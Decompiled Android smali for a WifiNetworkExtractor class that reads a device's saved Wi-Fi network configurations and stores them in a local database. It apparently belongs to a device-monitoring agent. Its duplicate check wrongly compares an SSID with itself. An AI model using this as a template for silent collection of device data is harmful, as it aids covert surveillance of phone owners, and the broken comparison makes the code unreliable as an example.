.class public Lcom/hp/vd/module/monitor/wifi/WifiNetworkExtractor;
.super Ljava/lang/Object;
.source "WifiNetworkExtractor.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "WifiNetworkExtractor"


# instance fields
.field protected context:Landroid/content/Context;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected wifiNetworkBaseDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/wifi/WifiNetworkBaseData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected wifiNetworkDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/WifiNetworkData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method public constructor <init>(Landroid/content/Context;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/wifi/WifiNetworkBaseData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/WifiNetworkData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 28
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 22
    iput-object v0, p0, Lcom/hp/vd/module/monitor/wifi/WifiNetworkExtractor;->context:Landroid/content/Context;

    .line 23
    iput-object v0, p0, Lcom/hp/vd/module/monitor/wifi/WifiNetworkExtractor;->wifiNetworkBaseDao:Lcom/j256/ormlite/dao/Dao;

    .line 24
    iput-object v0, p0, Lcom/hp/vd/module/monitor/wifi/WifiNetworkExtractor;->wifiNetworkDao:Lcom/j256/ormlite/dao/Dao;

    .line 25
    iput-object v0, p0, Lcom/hp/vd/module/monitor/wifi/WifiNetworkExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 29
    iput-object p1, p0, Lcom/hp/vd/module/monitor/wifi/WifiNetworkExtractor;->context:Landroid/content/Context;

    .line 31
    iput-object p2, p0, Lcom/hp/vd/module/monitor/wifi/WifiNetworkExtractor;->wifiNetworkBaseDao:Lcom/j256/ormlite/dao/Dao;

    .line 32
    iput-object p3, p0, Lcom/hp/vd/module/monitor/wifi/WifiNetworkExtractor;->wifiNetworkDao:Lcom/j256/ormlite/dao/Dao;

    .line 34
    iput-object p4, p0, Lcom/hp/vd/module/monitor/wifi/WifiNetworkExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method protected hasNetwork(Ljava/lang/String;Ljava/util/List;)Z
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            "Ljava/util/List<",
            "Lcom/hp/vd/data/wifi/WifiNetworkBaseData;",
            ">;)Z"
        }
    .end annotation

    .line 130
    invoke-interface {p2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object p1

    :cond_0
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result p2

    if-eqz p2, :cond_1

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object p2

    check-cast p2, Lcom/hp/vd/data/wifi/WifiNetworkBaseData;

    .line 132
    iget-object v0, p2, Lcom/hp/vd/data/wifi/WifiNetworkBaseData;->ssid:Ljava/lang/String;

    iget-object p2, p2, Lcom/hp/vd/data/wifi/WifiNetworkBaseData;->ssid:Ljava/lang/String;

    invoke-virtual {v0, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_0

    const/4 p1, 0x1

    return p1

    :cond_1
    const/4 p1, 0x0

    return p1
.end method

.method protected loadWifiNetworkBaseData(Lcom/j256/ormlite/dao/Dao;)Ljava/util/List;
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/wifi/WifiNetworkBaseData;",
            "Ljava/lang/Integer;",
            ">;)",
            "Ljava/util/List<",
            "Lcom/hp/vd/data/wifi/WifiNetworkBaseData;",
            ">;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/sql/SQLException;
        }
    .end annotation

    .line 125
    invoke-interface {p1}, Lcom/j256/ormlite/dao/Dao;->queryForAll()Ljava/util/List;

    move-result-object p1

    return-object p1
.end method

.method public run()V
    .locals 6

    .line 47
    :try_start_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/wifi/WifiNetworkExtractor;->wifiNetworkBaseDao:Lcom/j256/ormlite/dao/Dao;

    invoke-virtual {p0, v0}, Lcom/hp/vd/module/monitor/wifi/WifiNetworkExtractor;->loadWifiNetworkBaseData(Lcom/j256/ormlite/dao/Dao;)Ljava/util/List;

    move-result-object v0
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_3
    .catch Ljava/lang/IllegalStateException; {:try_start_0 .. :try_end_0} :catch_2

    .line 65
    :try_start_1
    iget-object v1, p0, Lcom/hp/vd/module/monitor/wifi/WifiNetworkExtractor;->context:Landroid/content/Context;

    const-string v2, "wifi"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/net/wifi/WifiManager;

    .line 66
    invoke-virtual {v1}, Landroid/net/wifi/WifiManager;->getConfiguredNetworks()Ljava/util/List;

    move-result-object v1

    if-eqz v1, :cond_3

    .line 68
    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v2

    if-nez v2, :cond_0

    goto :goto_1

    .line 74
    :cond_0
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :cond_1
    :goto_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_2

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/net/wifi/WifiConfiguration;

    .line 85
    iget-object v3, v2, Landroid/net/wifi/WifiConfiguration;->SSID:Ljava/lang/String;

    invoke-virtual {p0, v3, v0}, Lcom/hp/vd/module/monitor/wifi/WifiNetworkExtractor;->hasNetwork(Ljava/lang/String;Ljava/util/List;)Z

    move-result v3

    if-nez v3, :cond_1

    .line 86
    new-instance v3, Lcom/hp/vd/data/WifiNetworkData;

    invoke-direct {v3}, Lcom/hp/vd/data/WifiNetworkData;-><init>()V

    .line 87
    new-instance v4, Lcom/hp/vd/data/wifi/WifiNetworkBaseData;

    invoke-direct {v4}, Lcom/hp/vd/data/wifi/WifiNetworkBaseData;-><init>()V

    .line 89
    iget-object v5, v2, Landroid/net/wifi/WifiConfiguration;->SSID:Ljava/lang/String;

    iput-object v5, v4, Lcom/hp/vd/data/wifi/WifiNetworkBaseData;->ssid:Ljava/lang/String;

    .line 91
    iget-object v5, p0, Lcom/hp/vd/module/monitor/wifi/WifiNetworkExtractor;->wifiNetworkBaseDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v5, v4}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    .line 97
    iget-object v4, v2, Landroid/net/wifi/WifiConfiguration;->SSID:Ljava/lang/String;

    iput-object v4, v3, Lcom/hp/vd/data/WifiNetworkData;->ssid:Ljava/lang/String;

    .line 98
    iget-object v4, v2, Landroid/net/wifi/WifiConfiguration;->allowedAuthAlgorithms:Ljava/util/BitSet;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/WifiNetworkData;->authAlgorithm:Ljava/lang/String;

    .line 99
    iget-object v4, v2, Landroid/net/wifi/WifiConfiguration;->allowedGroupCiphers:Ljava/util/BitSet;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/WifiNetworkData;->groupCipher:Ljava/lang/String;

    .line 100
    iget-object v4, v2, Landroid/net/wifi/WifiConfiguration;->allowedKeyManagement:Ljava/util/BitSet;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/WifiNetworkData;->keyManagement:Ljava/lang/String;

    .line 101
    iget-object v4, v2, Landroid/net/wifi/WifiConfiguration;->allowedProtocols:Ljava/util/BitSet;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/WifiNetworkData;->protocol:Ljava/lang/String;

    .line 102
    iget-boolean v2, v2, Landroid/net/wifi/WifiConfiguration;->hiddenSSID:Z

    iput v2, v3, Lcom/hp/vd/data/WifiNetworkData;->hidden:I

    .line 104
    new-instance v2, Ljava/util/Date;

    invoke-direct {v2}, Ljava/util/Date;-><init>()V

    iput-object v2, v3, Lcom/hp/vd/data/WifiNetworkData;->createdAt:Ljava/util/Date;

    .line 106
    iget-object v2, p0, Lcom/hp/vd/module/monitor/wifi/WifiNetworkExtractor;->wifiNetworkDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v2, v3}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    goto :goto_0

    :cond_2
    return-void

    .line 69
    :cond_3
    :goto_1
    iget-object v0, p0, Lcom/hp/vd/module/monitor/wifi/WifiNetworkExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "WifiNetworkExtractor"

    const-string v2, "run(): no wifi networks"

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_1
    .catch Ljava/sql/SQLException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    return-void

    :catch_0
    move-exception v0

    .line 116
    iget-object v1, p0, Lcom/hp/vd/module/monitor/wifi/WifiNetworkExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "WifiNetworkExtractor"

    const-string v3, "Exception caught when saving data."

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_1
    move-exception v0

    .line 111
    iget-object v1, p0, Lcom/hp/vd/module/monitor/wifi/WifiNetworkExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "WifiNetworkExtractor"

    const-string v3, "SQLException caught when saving data."

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_2
    move-exception v0

    .line 55
    iget-object v1, p0, Lcom/hp/vd/module/monitor/wifi/WifiNetworkExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "WifiNetworkExtractor"

    const-string v3, "IllegalStateException caught while querying WifiNetworkBaseData"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_3
    move-exception v0

    .line 50
    iget-object v1, p0, Lcom/hp/vd/module/monitor/wifi/WifiNetworkExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "WifiNetworkExtractor"

    const-string v3, "SQLException caught while querying WifiNetworkBaseData."

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void
.end method
